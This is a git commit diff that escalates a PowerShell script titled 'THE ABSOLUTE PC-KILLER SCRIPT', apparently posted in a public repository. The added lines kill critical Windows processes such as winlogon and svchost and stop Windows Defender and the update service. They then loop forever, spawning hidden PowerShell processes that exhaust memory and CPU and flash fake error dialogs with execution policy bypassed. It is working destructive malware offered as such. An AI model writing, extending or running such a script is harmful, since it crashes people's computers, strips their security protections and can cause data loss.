32f94e1435ff42bd694cde7023afa7ab3ceb24d7
VanillaVulture <90653499+VanillaVulture@users.noreply.github.com>
2025-02-14 14:16:53 -0600

    Update 💀 THE ABSOLUTE PC-KILLER SCRIPT 💀.ps1

--- WARNING/💀 THE ABSOLUTE PC-KILLER SCRIPT 💀.ps1
+++ WARNING/💀 THE ABSOLUTE PC-KILLER SCRIPT 💀.ps1
@@ -1,21 +1,27 @@
-# Create a batch script to execute PowerShell with maximum bypass
+# Create a batch script for maximum destruction
 $batFile = "$env:Temp\crash.bat"
 $batContent = @"
 @echo off
-:: Disable UI Elements (Explorer, Task Manager)
+:: Disable UI Elements (Explorer, Task Manager, Windows Defender, Services)
 taskkill /F /IM explorer.exe
 taskkill /F /IM taskmgr.exe
-:: Open Endless Programs
+taskkill /F /IM smartscreen.exe
+taskkill /F /IM svchost.exe
+taskkill /F /IM winlogon.exe
+sc stop WinDefend
+sc stop Wuauserv
+sc stop BITS
+sc stop CryptSvc
+:: Flood System with Endless Programs
+:loop
 start notepad
 start cmd
 start mspaint
 start explorer
 start write
-:: Spam Fake Error Messages
-:loop
-msg * "CRITICAL SYSTEM ERROR! MEMORY OVERLOAD DETECTED!"
-start powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "& { while (`$true) { `$array = @(New-Object byte[] (500MB)) } }"
-start powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "& { while (`$true) { 1..1000000 | ForEach-Object { [math]::Pow(`$_, 2) } } }"
+start powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "& { while (`$true) { `$array = @(New-Object byte[] (1GB)) } }"
+start powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "& { while (`$true) { 1..10000000 | ForEach-Object { [math]::Pow(`$_, 2) } } }"
+start powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "& { while (`$true) { [System.Windows.Forms.MessageBox]::Show('FATAL ERROR! SYSTEM CRITICAL OVERLOAD!', 'Windows Error', 0, 16) } }"
 goto loop
 "@
 # Write batch file
